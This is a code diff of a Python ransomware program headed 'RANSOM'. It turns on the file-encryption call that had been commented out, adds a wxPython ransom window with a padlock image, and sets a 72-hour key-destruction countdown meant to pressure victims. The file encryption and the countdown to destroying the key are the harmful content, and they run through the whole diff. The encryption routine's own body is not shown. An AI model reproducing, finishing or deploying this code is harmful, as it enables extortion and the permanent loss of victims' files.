@@ -1,14 +1,18 @@
 ## RANSOM
 ## Main Script
 ## author mls
+# TODO Increase window size or decrease padlock image size
+# Remote close X button
+# Add option to decrypt using the actual form!
+# Store and read start time from window registry
 
 # Import libs
-import ctypes
 import os
 import sys
 import win32api
 import winerror
 import win32event
+import wx
 
 # Import classes
 import Crypt
@@ -21,6 +25,9 @@ import Gui
 ################
 class Main(Base.Base):
   # Class to create a main object for the program
+  
+  # Class Variables
+  KEY_DESTRUCT_TIME_SECONDS = 259200
 
 
   def __init__(self, action, decrypt_key):
@@ -39,13 +46,21 @@ class Main(Base.Base):
     # handle action
     if action == "encrypt" and not os.path.isfile(self.encrypted_file_list):
       # Start encryption
-      #self.encrypt_files(file_list)
-      #self.set_wallpaper()
+      self.encrypt_files(file_list)
       # Present GUI
-      window = Gui.Gui()
+      self.start_gui()
     elif action == "decrypt":
       # Start decryption
       self.decrypt_files()
+      
+      
+  def start_gui(self):
+    # Function to open to GUI
+    
+    app = wx.App()
+    crypter_gui = Gui.MyFrame1(None, sys._MEIPASS, self.KEY_DESTRUCT_TIME_SECONDS)
+    crypter_gui.Show()
+    app.MainLoop()
       
 
   def decrypt_files(self):
@@ -148,6 +163,7 @@ class Main(Base.Base):
 
   def set_wallpaper(self):
     # Function to set the ransom wallpaper
+    # FUNCTION NOW OBSOLETE: No longer chaning desktop wallpaper
 
     # Import image and write to path
     # todo adjust file name... maybe replace this with whatever is provided in the config file?
